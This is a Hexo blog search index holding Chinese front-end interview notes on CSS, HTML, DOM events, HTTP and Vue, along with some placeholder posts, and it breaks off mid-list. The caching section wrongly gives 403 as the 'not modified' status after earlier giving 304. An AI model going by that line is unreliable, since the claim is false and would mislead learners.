<?xml version="1.0" encoding="utf-8"?>
<search>
  <entry>
    <title>2020前端面试题基础篇(CSS)</title>
    <url>/2020/04/28/2020%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E5%9F%BA%E7%A1%80%E7%AF%87(CSS)/</url>
    <content><![CDATA[<h2 id="CSS"><a href="#CSS" class="headerlink" title="CSS"></a>CSS</h2><ul>
<li>知识点如下：<ol>
<li><strong>必考</strong>：两种盒模型分别说一下。</li>
<li><strong>必考</strong>：如何垂直居中？</li>
<li><strong>必考</strong>：flex 怎么用，常用属性有哪些？</li>
<li><strong>必考</strong>：BFC 是什么？</li>
<li>CSS 选择器优先级（<strong>不是必考但是也特别重要</strong>）</li>
<li>清除浮动说一下<a id="more"></a></li>
</ol>
</li>
</ul>
<ol>
<li><p><strong>必考</strong>：两种盒模型分别说一下。<br>先说两种盒模型分别怎么写，具体到代码。然后<strong>拔高点就说你平时喜欢用border box</strong>，因为更好用。</p>
</li>
<li><p><strong>必考</strong>：如何垂直居中？<br>背代码 <a href="https://jscode.me/t/topic/1936" target="_blank" rel="noopener">https://jscode.me/t/topic/1936</a>，简单记忆<strong>table两种</strong>(表格自己和div装成表格),<strong>比较特别的一种就是100%高度的inline-block</strong>，<strong>绝对定位三种</strong>（先根据父元素定位，再改变自身的位置有两种translate,margin。还有一种是上下左右都是0，然后margin为auto），最后就是<strong>flex一种</strong>,<strong>if1,t2,a3</strong><br>拔高点就说是<strong>回溯机制</strong>，但是具体是什么只是听说,也可以不说</p>
</li>
<li><p><strong>必考</strong>：flex 怎么用，常用属性有哪些？<br>看 <a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Flexible_Box_Layout/Basic_Concepts_of_Flexbox" target="_blank" rel="noopener">MDN</a>，背代码。一般是给一具体的场景让你用代码去实现。比如这种<a href="https://jsbin.com/raquxipihe/1/edit?html,css,js,output" target="_blank" rel="noopener">场景</a>, 其中用到的<code>margin-left:auto</code>可以参考以前的<a href="https://github.com/bomber063/DIY-UI-frame-by-Vue-for-all/tree/tabs" target="_blank" rel="noopener">笔记</a></p>
<ul>
<li><p><img src="/img/flex-container.png" alt="flex-container"></p>
</li>
<li><p>flex-container</p>
<table>
<thead>
<tr>
<th align="center">属性名称</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">flex-direction</td>
<td align="center">方向</td>
</tr>
<tr>
<td align="center">flex-wrap</td>
<td align="center">换行</td>
</tr>
<tr>
<td align="center">flex-flow</td>
<td align="center">上面两个的简写</td>
</tr>
<tr>
<td align="center">justify-content</td>
<td align="center">主轴方向对齐方式</td>
</tr>
<tr>
<td align="center">align-items</td>
<td align="center">侧轴方向对齐方式</td>
</tr>
<tr>
<td align="center">align-content</td>
<td align="center">多行/列内容对齐方式</td>
</tr>
</tbody></table>
</li>
<li><p>简单记忆c-dwf-jam</p>
</li>
<li><p><img src="/img/flex-item.png" alt="flex-item"></p>
</li>
<li><p>flex-item</p>
<table>
<thead>
<tr>
<th align="center">属性名称</th>
<th align="center">作用</th>
</tr>
</thead>
<tbody><tr>
<td align="center">flex-grow</td>
<td align="center">增长比例（空间过多时）</td>
</tr>
<tr>
<td align="center">flex-shrink</td>
<td align="center">收缩比例（空间不够时）</td>
</tr>
<tr>
<td align="center">flex-basis</td>
<td align="center">默认大小（一般不用，单位用px表示）</td>
</tr>
<tr>
<td align="center">flex</td>
<td align="center">上面三个的简写</td>
</tr>
<tr>
<td align="center">order</td>
<td align="center">顺序（代替双飞翼）</td>
</tr>
<tr>
<td align="center">align-self</td>
<td align="center">自身的对齐方式</td>
</tr>
</tbody></table>
</li>
<li><p>简单记忆i-bgs-os</p>
</li>
</ul>
</li>
<li><p><strong>必考</strong>：BFC 是什么？<br>背 BFC 触发条件，<a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/CSS/Block_formatting_context" target="_blank" rel="noopener">MDN——块格式化上下文</a> 写了。<br>但是不用全部背下来，面试官只知道其中几个：<br>浮动元素（元素的 float 不是 none）<br>绝对定位元素（元素的 position 为 absolute 或 fixed）<br>行内块元素<br>overflow 值不为 visible 的块元素<br>弹性元素（display为 flex 或 inline-flex元素的直接子元素）<br>回答最好用<strong>中文解释翻译，翻译就是块格式化上下文，加上举例法</strong>,下面的例子</p>
<ul>
<li>功能1：爸爸管儿子<br><a href="http://js.jirengu.com/rozaxufetu/1/edit?html,css,output" target="_blank" rel="noopener">用 BFC 包住浮动元素</a>。(这 TM 不是清除浮动，.clearfix 才是清除浮动）</li>
<li>功能2：兄弟之间划清界限<br><a href="http://js.jirengu.com/felikenuve/1/edit?html,css,output" target="_blank" rel="noopener">用 float + div 做左右自适应布局</a></li>
<li>功能3：防止margin合并——<a href="https://developer.mozilla.org/zh-CN/docs/Web/CSS/CSS_Box_Model/Mastering_margin_collapsing" target="_blank" rel="noopener">MDN关于margin合并</a><br><a href="http://js.jirengu.com/dobapoboxi/1/edit?html,css,output" target="_blank" rel="noopener">用BFC防止margin合并</a></li>
<li>简单记忆就是浮动（腐），分栏（烂），合并（病）。（腐烂病）</li>
</ul>
</li>
<li><p>CSS 选择器优先级（<strong>不是必考但是也特别重要</strong>）<br>背人云亦云的<a href="https://www.cnblogs.com/xugang/archive/2010/09/24/1833760.html" target="_blank" rel="noopener">答案（错答案、已过时）</a><br>看面试官脸色行事<br><strong>最好是举例子说明</strong><br>方方给的三句话<br>越具体优先级越高<br>同样优先级写在后面的覆盖写在前面的<br>!important 优先级最高，但是要少用</p>
</li>
<li><p>清除浮动说一下<br>背代码</p>
<figure class="highlight css"><table><tr><td class="code"><pre><span class="line"><span class="selector-class">.clearfix</span><span class="selector-pseudo">:after</span>&#123;</span><br><span class="line">    <span class="attribute">content</span>: <span class="string">''</span>;</span><br><span class="line">    <span class="attribute">display</span>: block; <span class="comment">/*或者 table*/</span></span><br><span class="line">    <span class="attribute">clear</span>: both;</span><br><span class="line">&#125;</span><br><span class="line"><span class="selector-class">.clearfix</span>&#123;</span><br><span class="line">    <span class="attribute">zoom</span>: <span class="number">1</span>; <span class="comment">/* IE 兼容*/</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>clearfix加到容器上（也就是父元素上），那么里面的子元素浮动就被清除掉了。</li>
<li>简单记忆就是ca，c就是clearfix，a就是after。ccd(content,clear,display)</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>CSS</category>
      </categories>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>2020前端面试题基础篇(HTML)</title>
    <url>/2020/04/27/2020%E5%89%8D%E7%AB%AF%E9%9D%A2%E8%AF%95%E9%A2%98%E5%9F%BA%E7%A1%80%E7%AF%87(HTML)/</url>
    <content><![CDATA[<h2 id="HTML"><a href="#HTML" class="headerlink" title="HTML"></a>HTML</h2><ul>
<li>知识点如下：<ol>
<li><strong>必考</strong>：你是如何理解 HTML 语义化的？(抽象题目具体化，举例)</li>
<li>meta viewport 是做什么用的，怎么写？</li>
<li>你用过哪些 [HTML 5](<a href="https://developer.mozilla" target="_blank" rel="noopener">https://developer.mozilla</a><br>.org/zh-CN/docs/Web/Guide/HTML/HTML5/HTML5_element_list) 标签？</li>
<li>H5 是什么？<a id="more"></a></li>
</ol>
</li>
</ul>
<ol>
<li><p><strong>必考</strong>：你是如何理解 HTML 语义化的？(抽象题目具体化，举例)</p>
<ol>
<li>举例法<br>HTML 语义化就是使用正确的标签（总结）段落就写 p 标签，标题就写 h1 标签，文章就写article标签，视频就写video标签，时间用<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/time" target="_blank" rel="noopener">time标签</a>，画板用<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Canvas_API" target="_blank" rel="noopener">canvas标签</a>等等。</li>
<li>阐述法(补充)</li>
</ol>
<ul>
<li>首先讲以前的后台开发人员使用table标签布局，然后讲美工人员使用div+css布局（<strong>但是，不够语义化，分不清不同DIV之间有什么区别</strong>），最后讲专业的前端会使用正确的标签进行页面开发。</li>
<li>所以最前面那种不是正确的写法，然后div+css的写法虽然有一些改进，但是换汤不换药，也不够合适。</li>
</ul>
</li>
<li><p>meta viewport 是做什么用的，怎么写？</p>
<ul>
<li>它的功能就是<strong>手机上想让页面不能缩放</strong>应该使用的。</li>
<li>我们可以在google上面搜索github head然后找到这个<a href="https://github.com/joshbuchea/HEAD" target="_blank" rel="noopener">git仓库地址</a>,这个仓库把所有流行的meta写法都写上了。这里是外国人的写法，下面的是中国人的写法。</li>
</ul>
<ol>
<li>举例法<figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1, maximum-scale=1, minimum-scale=1"</span>&gt;</span></span><br></pre></td></tr></table></figure>
（<strong>简单记忆</strong>，牛叉（nc），n就是name，c就是content.content里面就是w3s,w是设备宽度，3s分别是初始，最大，最小放大倍数。）<br>然后逐个解释每个单词的意思。</li>
</ol>
<ul>
<li>更多补充：由于近几年手机的发展，导致前端开发的工作重心从电脑桌面移动到手机上，所以会有viewport的出现。</li>
<li><a href="https://juejin.im/post/5d804e0b518825297023fee7" target="_blank" rel="noopener">博客链接1</a>,<a href="https://www.cnblogs.com/2050/p/3877280.html" target="_blank" rel="noopener">博客链接2</a></li>
</ul>
</li>
<li><p>你用过哪些 <a href="https://developer.mozilla.org/zh-CN/docs/Web/Guide/HTML/HTML5/HTML5_element_list" target="_blank" rel="noopener">HTML 5</a> 标签？<br>举例法<br>平时如果只用div写页面你就完了，把你平时用到的html5标签列举出来即可，但是要注意如果这个标签的用法比较复杂，你要先看一下MDN的文档再说这个标签；<strong>如果你说出一个标签，却不知道它有哪些API，那么你就会被扣分</strong></p>
<ul>
<li>常见的章节相关的 <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/section" target="_blank" rel="noopener">section</a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/header" target="_blank" rel="noopener">header</a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/main" target="_blank" rel="noopener">main</a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/footer" target="_blank" rel="noopener">footer</a> <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/article" target="_blank" rel="noopener">article</a></li>
<li>还有少用嵌入内容的<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/canvas" target="_blank" rel="noopener">canvas</a>, <figure class="highlight html"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">canvas</span> <span class="attr">id</span>=<span class="string">"canvas"</span> <span class="attr">width</span>=<span class="string">"300"</span> <span class="attr">height</span>=<span class="string">"300"</span>&gt;</span> </span><br><span class="line"><span class="comment">&lt;!--  抱歉，您的浏览器不支持canvas元素--&gt;</span></span><br><span class="line"><span class="comment">&lt;!--  （这些内容将会在不支持&lt;canvas&gt;元素的浏览器或是禁用了JavaScript的浏览器内渲染并展现）--&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">canvas</span>&gt;</span></span><br></pre></td></tr></table></figure>
JavaScript<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="comment">//使用HTMLCanvasElement.getContext()获得一个绘图上下文并开始绘制</span></span><br><span class="line"><span class="keyword">var</span> canvas = <span class="built_in">document</span>.getElementById(<span class="string">'canvas'</span>); <span class="comment">//获取到canvas元素</span></span><br><span class="line"><span class="keyword">var</span> ctx = canvas.getContext(<span class="string">'2d'</span>); <span class="comment">//获取到canvas2d上下文</span></span><br><span class="line">ctx.fillStyle = <span class="string">'green'</span>; <span class="comment">//颜色</span></span><br><span class="line">ctx.fillRect(<span class="number">10</span>, <span class="number">10</span>, <span class="number">100</span>, <span class="number">100</span>);<span class="comment">//范围</span></span><br></pre></td></tr></table></figure>
<a href="https://developer.mozilla.org/zh-CN/docs/Web/SVG/Element/svg" target="_blank" rel="noopener">svg</a>，还有<a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/audio" target="_blank" rel="noopener">audio</a>, <a href="https://developer.mozilla.org/zh-CN/docs/Web/HTML/Element/video" target="_blank" rel="noopener">video</a><br>有poster 海报的封面url, src嵌入视频的地址，loop循环播放，autoplay自动播放等。 </li>
<li>不熟悉最好不要说这些。</li>
</ul>
</li>
<li><p>H5 是什么？<br>阐述法<br>搜一下知乎就知道了，<strong>H5表示移动端页面</strong>，反正不是HTML5。用<code>site:zhihu.com</code>得到<a href="https://www.zhihu.com/question/30363342" target="_blank" rel="noopener">知乎页面——H5 是什么？</a></p>
<ul>
<li>也可以说HTML5并<strong>不是一项技术</strong>，而是<strong>一个标准</strong>。</li>
<li>理论派讨论<strong>HTML5标准</strong>，要么是作为实践派讨论<strong>HTML5标准在某浏览器的应用</strong></li>
<li>所以我们在谈论H5的时候，实际上是一个<b>解决方案</b>，一个看起来<b>酷炫</b>的移动端onepage网站的解决方案。而这个解决方案不仅包含了HTML5新增的audio标签，canvas，拖拽特性，本地存储，websocket通信，同时也包括了<b>盒模型</b>，包括<b>绝对定位</b>，包括<b>一切前端的基本知识</b>。H5本应是一个技术合集</li>
</ul>
</li>
</ol>
]]></content>
      <categories>
        <category>HTML</category>
      </categories>
      <tags>
        <tag>HTML</tag>
      </tags>
  </entry>
  <entry>
    <title>readme</title>
    <url>/2020/02/03/README/</url>
    <content><![CDATA[<ul>
<li>hahaha</li>
</ul>
]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>Hello World</title>
    <url>/2013/07/13/hello-world/</url>
    <content><![CDATA[<p>updated: 2018-01-01 12:00:00<br>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p>
<a id="more"></a>
<h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p>
<h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p>
<h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p>
<h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure>

<p>More info: <a href="https://hexo.io/docs/one-command-deployment.html" target="_blank" rel="noopener">Deployment</a></p>
<p><img src="https://static.xiedaimala.com/xdml/image/02c5b19d-3b0e-47a8-a93b-301578c0f039/2019-4-8-10-45-40.png" alt=""></p>
]]></content>
      <categories>
        <category>JS</category>
        <category>TS</category>
      </categories>
      <tags>
        <tag>JavaScript</tag>
        <tag>Testing</tag>
      </tags>
  </entry>
  <entry>
    <title>aaaa</title>
    <url>/2020/02/03/nihao111/</url>
    <content><![CDATA[<h2 id="diyi"><a href="#diyi" class="headerlink" title="diyi"></a>diyi</h2><ul>
<li>meiyou </li>
</ul>
]]></content>
      <tags>
        <tag>CSS</tag>
      </tags>
  </entry>
  <entry>
    <title>aaaa</title>
    <url>/2020/05/02/nihao/</url>
    <content><![CDATA[<h2 id="DOM"><a href="#DOM" class="headerlink" title="DOM"></a>DOM</h2><ol>
<li><p><strong>必考</strong>：事件委托</p>
<a id="more"></a>
<ul>
<li>事件代理（Event Delegation），又称之为<strong>事件委托</strong>。是JavaScript中常用绑定事件的常用技巧。顾名思义，“事件代理”即是把<strong>原本需要绑定在子元素的响应事件（click、keydown……）委托给父元素，让父元素担当事件监听的职务。事件代理的原理是DOM元素的事件冒泡。</strong><br>错误版（但是可能能过）<figure class="highlight js"><table><tr><td class="code"><pre><span class="line">ul.addEventListener(<span class="string">'click'</span>, <span class="function"><span class="keyword">function</span>(<span class="params">e</span>)</span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(e.target.tagName.toLowerCase() === <span class="string">'li'</span>)&#123;</span><br><span class="line">        fn() <span class="comment">// 执行某个函数</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;)</span><br></pre></td></tr></table></figure>
bug 在于，如果用户点击的是 li 里面的 span，就没法触发 fn，这显然不对。<br>高级版，用到<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/matches" target="_blank" rel="noopener">Element.matches()</a><figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">delegate</span>(<span class="params">element, eventType, selector, fn</span>) </span>&#123;<span class="comment">//element是委托的元素，eventType是绑定的事件，selector是事件执行后判断使用的选择器，fn是事件执行后需要执行的函数。</span></span><br><span class="line">    element.addEventListener(eventType, e =&gt; &#123;</span><br><span class="line">      <span class="keyword">let</span> el = e.target</span><br><span class="line">      <span class="keyword">while</span> (!el.matches(selector)) &#123;<span class="comment">//判断执行事件的元素如果是selector选择器就不仅如此这个循环</span></span><br><span class="line">        <span class="keyword">if</span> (element === el) &#123;<span class="comment">//如果不是这个selector那么就进入这个循环，然后判断是不是委托的元素element。如果是这里就把el设置为null，并且中止退出循环，也可以看成到顶的一个元素，也就是委托的元素</span></span><br><span class="line">          el = <span class="literal">null</span></span><br><span class="line">          <span class="keyword">break</span></span><br><span class="line">        &#125;</span><br><span class="line">        el = el.parentNode<span class="comment">//如果不是委托的element，那么说明还需要在父节点上面继续找，继续循环</span></span><br><span class="line">      &#125;</span><br><span class="line">      el &amp;&amp; fn.call(el, e, el)<span class="comment">//如果el存在，就执行函数fu,并且传入this为el,并传入两个参数e和el。</span></span><br><span class="line">    &#125;)</span><br><span class="line">    <span class="keyword">return</span> element<span class="comment">//返回这个事件委托的元素，为了让外面知道</span></span><br><span class="line">  &#125;</span><br></pre></td></tr></table></figure>
思路是点击 span 后，递归遍历 span 的祖先元素看其中有没有 ul 里面的 li。<br>完整的测试代码可以查看<a href="http://js.jirengu.com/topufepetu/1/edit?js,output" target="_blank" rel="noopener">这里</a><br><strong>简单记忆，四个参数，寒(函数)暄（选择器）卫（委托的元素）视（事件）</strong><br><a href="http://www.mamicode.com/info-detail-2546140.html" target="_blank" rel="noopener">委托事件参考1</a><br><a href="https://blog.csdn.net/qq_38128179/article/details/86293394" target="_blank" rel="noopener">委托事件参考2</a></li>
</ul>
</li>
<li><p><strong>曾考</strong>：用 mouse 事件写一个可拖曳的 div    </p>
<ul>
<li><a href="https://jsbin.com/munuzureya/edit?html,js,output" target="_blank" rel="noopener">参考代码</a>  </li>
<li>我自己写的<a href="https://jsbin.com/gakorujiwi/1/edit?js,output" target="_blank" rel="noopener">代码</a>，解决了移出视口后找不到图形的bug   </li>
<li>这里的用到鼠标事件API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mousedown_event" target="_blank" rel="noopener">mousedown</a>,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mousemove_event" target="_blank" rel="noopener">mousemove</a>,<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/Element/mouseup_event" target="_blank" rel="noopener">mouseup</a>;   </li>
<li>用到获取鼠标点击位置距离视口位置的API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MouseEvent/clientX" target="_blank" rel="noopener">MouseEvent.clientX</a>和<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/MouseEvent/clientY" target="_blank" rel="noopener">MouseEvent.clientY</a>;   </li>
<li>用到获取元素距离视口的位置的API-<a href="https://developer.mozilla.org/zh-CN/docs/Web/API/HTMLElement/style" target="_blank" rel="noopener">HTMLElement.style</a>, Element.style.top,Element.style.left;    </li>
<li>用到非数字（比如10px）转换为数字(比如10)的API——<a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/parseInt" target="_blank" rel="noopener">parseInt</a>   </li>
<li>主要思路就是监听鼠标点击（获取鼠标点击的视口位置，设置dragging为true），移动（，转化非数字为数字，比如转为10px转为10，把之前的css的位置加上增加的变化的位置，<strong>最后</strong>获取鼠标点击的视口位置）和松开状态（鼠标松开后拖动状态设置为false）。<strong>另外要记住鼠标移动和松开的监听的元素应该是document</strong><h2 id="HTTP"><a href="#HTTP" class="headerlink" title="HTTP"></a>HTTP</h2></li>
</ul>
</li>
<li><p><strong>必考</strong>：HTTP 状态码知道哪些？分别什么意思？<br>1xx 信息，继续发剩余部分的请求<br>简单记忆就是心（信息）意（1）<br>2xx 表示成功<br>3xx 表示需要进一步操作<br>4xx 表示浏览器方面出错<br>5xx 表示服务器方面出错<br><a href="http://www.runoob.com/http/http-status-codes.html" target="_blank" rel="noopener">完整参考</a></p>
<ul>
<li>1开头<ul>
<li>一切（01，切换协议）</li>
</ul>
</li>
<li>2开头<ul>
<li>雌（01——已<strong>创</strong>建，拼音第一个是c，雌第一个也是c）</li>
<li>激（02——已<strong>接</strong>受，拼音第一个是j，激第一个也是j）</li>
<li>素（03——非<strong>授</strong>权，拼音第一个是s，授第一个也是s）</li>
<li>五（04——<strong>无</strong>内容）</li>
<li>支（05——重<strong>置</strong>支内容）</li>
<li>部（06——<strong>部</strong>分内容）</li>
</ul>
</li>
<li>3开头<ul>
<li>就（01——永<strong>久</strong>移动）</li>
<li>是（02——临<strong>时</strong>移动）</li>
<li>只（03——查看其他地<strong>址</strong>）</li>
<li>为（04——<strong>未</strong>修改，缓存）</li>
<li>你（05——使用代<strong>理</strong>）</li>
</ul>
</li>
<li>4开头<ul>
<li>震（01 要求身份认<strong>证</strong>）</li>
<li>爆（02 <strong>保</strong>留，将来使用）</li>
<li>狙（03 <strong>拒</strong>绝执行此请求）</li>
<li>元（04 无法根据客户端请求找到资<strong>源</strong>（网址））</li>
<li>芳（05 请求方<strong>法</strong>被禁止）</li>
<li>08（请求时间过长，这里也可以用巴士，巴对应8，<strong>士</strong>对应<strong>时间</strong>）和14（请求的URL过长），长（过长）巴（8）士（4）</li>
</ul>
</li>
<li>5开头<ul>
<li>公（01——服务器不支持请求的<strong>功</strong>能，无法完成请求）</li>
<li>务（02——收到了一个<strong>无</strong>效的响应）</li>
<li>危（03——超载或系统<strong>维</strong>护，服务器暂时的无法处理客户端的请求）</li>
<li>机（04——未<strong>及</strong>时从远端服务器获取请求）</li>
<li>本（05——服务器不支持请求的HTTP协议的版<strong>本</strong>）</li>
</ul>
</li>
</ul>
</li>
<li><p><strong>大公司必考</strong>：HTTP 缓存有哪几种？<br>需要详细的了解 ETag、CacheControl、Expires 的异同<br><a href="https://imweb.io/topic/5795dcb6fb312541492eda8c" target="_blank" rel="noopener">参考</a><br><a href="https://github.com/bomber063/Session-LocalStorage-Cache-Control-for-45" target="_blank" rel="noopener">自己写的笔记</a><br>答题要点：<br>ETag 是通过对比浏览器和服务器资源的特征值（如MD5）来决定是否要发送文件内容，如果一样就只发送 304（not modified）<br>Expires 是设置过期时间（绝对时间），但是如果用户的本地时间错乱了，可能会有问题<br>CacheControl: max-age=3600 是设置过期时长（相对时间），跟本地时间无关。<br><strong>相对绝对时间</strong><br>一（<strong>E</strong>xpires）本(本地事件)（<strong>Ca</strong>cheControl）才对（相对）<br>提（e<strong>T</strong>ag）拉（<strong>L</strong>ast-Modified）箱（响应）,父（I<strong>f</strong>-None-Match或I<strong>f</strong>-Modified-Since）亲（<strong>请</strong>求）<br>If-None-Match对应ETag（naive，发音——拿(<strong>None</strong>)衣(<strong>E</strong>Tag)服）<br>If-Modified-Since对应Last-Modified<br>通过Expires头部或者Cache-Control头部，浏览器发现该资源已经缓存了而且没有过期，<strong>不需要发请</strong>求直返响应200。<br>通过ETag或者Last-Modified需要发请求，确定ETag值或者修改日期是否不同，如果相同也是需要发请求，返回403未修改，返回内容为空。<br>时间（Expires头部或者Cache-Control）<br>验证（ETag或者Last-Modified）  </p>
<blockquote>
<p>大公司可能会问http缓存顺序PWA  </p>
</blockquote>
</li>
<li><p><strong>必考</strong>：GET 和 POST 的区别<br><strong>错解，但是能过面试</strong><br>GET在浏览器回退时是无害的，而POST会再次提交请求。<br>GET产生的URL地址可以被加入收藏栏，而POST不可以。<br>GET请求会被浏览器主动cache，而POST不会，除非手动设置。<br>GET请求只能进行url编码，而POST支持多种编码方式。<br>GET请求参数会被完整保留在浏览器历史记录里，而POST中的参数不会被保留。<br>GET请求在URL中传送的参数是有长度限制的(一般2K左右)，而POST么有。（其实也是有的，大约4M-20M左右）<br>对参数的数据类型，GET只接受ASCII字符，而POST没有限制。<br>GET比POST更不安全，因为参数直接暴露在URL上，所以不能用来传递敏感信息。<br>GET参数通过URL传递，POST放在Request body也就是消息体中传递。<br>GET只有一个报文，而POST需要两个以上（因为它有消息体）<br>GET幂等（幂等就是多次GET是不会改变任何数据库里面的信息），POST不幂等（提交请求当然会改变数据库）<br>正解<br>就一个区别：语义——GET 用于获取资源，POST 用于提交资源。<br><a href="https://zhuanlan.zhihu.com/p/22536382" target="_blank" rel="noopener">想装逼请参考</a>  </p>
<p>回退 收藏栏 cache缓存 编码 历史记录 长度，字符，安全，传递，报文（数据包），幂等<br>回收村边立场治安保密</p>
<p>简单记忆——<strong>村（缓存）边（编码）的（传递）秘（幂等）技（历史记录）包（报文）子（字符）全（安全）都（长度）回（回退）收（收藏栏）</strong>   </p>
</li>
<li><p>Cookie V.S. LocalStorage V.S. SessionStorage V.S. Session<br><a href="https://github.com/bomber063/Session-LocalStorage-Cache-Control-for-45" target="_blank" rel="noopener">自己关于区别的笔记</a></p>
<ul>
<li>首先解释三者<ul>
<li>Cookie——服务器通过Set-Cookie头给客户端一串字符串，客户端每次访问相同域名的网页时，必须带上这段字符串</li>
<li>Session——一段时间内的会话</li>
<li>localStorage和SessionStorage它们是HTML5技术提供的的API。</li>
</ul>
</li>
<li>Cookie V.S. LocalStorage（大小、请求和用户信息）<ul>
<li>主要区别是 Cookie 会被发送到服务器，而 LocalStorage 不会,因为LocalStorage跟HTTP无关.</li>
<li>Cookie 一般最大 4k，LocalStorage 可以用 5Mb 甚至 10Mb（各浏览器不同,经过测试，我的电脑的所有浏览器可以储存65MB）</li>
<li>Cookie存用户信息比如SessionID，LocalStorage存一些不重要的数据。</li>
</ul>
</li>
<li>LocalStorage V.S. SessionStorage（过期）<ul>
<li>LocalStorage 一般不会自动过期（除非用户手动清除），而 SessionStorage 在回话（Session）结束时过期（如关闭浏览器）</li>
</ul>
</li>
<li>Cookie V.S. Session（浏览器和服务器）<ul>
<li>Cookie 存在浏览器的文件里，每次都随请求发送给 Server。而Session 存在服务器的文件里</li>
<li>Session 是基于 Cookie 实现的，具体做法就是把 SessionID 存在 Cookie 里 </li>
<li>Cookie可以篡改，Session避免了篡改。 </li>
</ul>
</li>
</ul>
</li>
<li><p>HTTP1和HTTP2区别（也就是HTTP1.1和HTTP2.0的区别）</p>
<ul>
<li>HTTP2新特性<ul>
<li>多路复用（MultiPlexing），即<strong>连接共享</strong>，即每一个request都是是用作连接共享机制的。一个request对应一个id，这样<strong>一个连接上可以有多个request</strong>，每个连接的request可以随机的混杂在一起，接收方可以根据request的 id将request再<strong>归属</strong>到各自不同的<strong>服务端</strong>请求里面。</li>
<li>服务端推送（server push），例如我的网页有一个sytle.css的请求，在客户端收到sytle.css数据的同时，服务端会将sytle.js的文件推送给客户端，当客户端再次尝试获取sytle.js时就可以直接从缓存中获取到，不用再发请求了。</li>
<li>HTTP2是强制开启https的。<br><a href="https://imququ.com/post/http2-new-opportunities-and-challenges.html" target="_blank" rel="noopener">详细可以看这位大神的分析</a><h2 id="Vue"><a href="#Vue" class="headerlink" title="Vue"></a>Vue</h2></li>
</ul>
</li>
</ul>
</li>
<li><p><strong>必考</strong>：watch 和 computed 和 methods 区别是什么？<br>思路：先翻译单词，再阐述作用，最后强行找不同。<br>watch就是<strong>监听</strong>数据的变化。computed是<strong>计算</strong>属性<br>要点：<br>computed 和 methods 相比，最大区别是 computed 有缓存（内存缓存）：如果 computed 属性依赖的属性没有变化，那么 computed 属性就不会重新计算。methods 则是看到一次计算一次。<br>watch 和 computed 相比，computed 是计算出一个属性（废话），而 watch 则可能是做别的事情（如上报数据）<br><a href="https://cn.vuejs.org/v2/guide/computed.html#%E8%AE%A1%E7%AE%97%E5%B1%9E%E6%80%A7-vs-%E4%BE%A6%E5%90%AC%E5%B1%9E%E6%80%A7" target="_blank" rel="noopener">计算属性 vs 侦听属性</a><br><a href="https://cn.vuejs.org/v2/api/#computed" target="_blank" rel="noopener">计算属性</a><br><a href="https://cn.vuejs.org/v2/api/#watch" target="_blank" rel="noopener">watch</a><br><a href="https://github.com/Advanced-Frontend/Daily-Interview-Question/issues/304" target="_blank" rel="noopener">更多的区别有如下几点：</a>  </p>
<ul>
